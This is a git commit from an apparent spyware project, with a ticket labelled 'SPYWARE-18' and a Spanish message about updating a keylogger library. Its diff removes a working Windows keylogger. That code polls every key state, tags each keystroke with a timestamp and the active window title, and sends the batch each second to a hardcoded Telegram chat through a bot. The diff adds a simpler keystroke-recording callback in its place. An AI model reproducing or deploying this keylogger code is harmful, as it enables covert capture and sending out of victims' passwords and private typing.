fa1834e0c96b7a6d3d1720e26d0b139bdba23817
Roger-Valles <roger.valles@enti.cat>
2025-01-11 17:14:17 +0100

    SPYWARE-18 Actualización de keylogger
    Hemos hecho una actualización en la libreria del keylogger

--- keylogger.py
+++ keylogger.py
@@ -1,34 +1,16 @@
-import asyncio
 from datetime import datetime
-import win32api
 import win32gui
-from helpers import get_key, registro_errores
 
-lista_teclas = []
+llista_teclas = []
 
-async def capturar_teclas(bot):
-    global lista_teclas
-    while True:
-        await asyncio.sleep(0.01)
-        hwnd = win32gui.GetForegroundWindow()
-        window_title = win32gui.GetWindowText(hwnd)
-        mayuscula = win32api.GetKeyState(0x10) & 0x8000 != 0
-        alt_gr = (win32api.GetKeyState(0x11) & 0x8000 != 0) and (win32api.GetKeyState(0x12) & 0x8000 != 0)
-        timestamp = datetime.now().strftime("[%H-%M-%S]")
+def detect_k(key):
+    print(f"Tecla detectada: {str(key)}")
 
-        for codigo_tecla in range(256):
-            if win32api.GetAsyncKeyState(codigo_tecla) & 1:
-                tecla = f"{timestamp} |{window_title.strip()}|  ({get_key(codigo_tecla, mayuscula, alt_gr)})"
-                lista_teclas.append(tecla)
-                print(f"Key captured: {tecla}")
-
-async def enviar_teclas(bot):
-    global lista_teclas
-    while True:
-        await asyncio.sleep(1)
-        if lista_teclas:
-            try:
-                await bot.send_message(chat_id="817416698", text="\n".join(lista_teclas))
-                lista_teclas.clear()
-            except Exception as e:
-                registro_errores(f"Error sending key presses: {e}")
+def release_k(key):
+    global llista_teclas
+    hwnd = win32gui.GetForegroundWindow()
+    window_title = win32gui.GetWindowText(hwnd)
+    tecla = str(key)
+    timestamp = datetime.now().strftime("[%H-%M-%S]")
+    mensaje_bot = f"{timestamp} |{window_title.strip()}|  {tecla}"
+    llista_teclas.append(mensaje_bot)
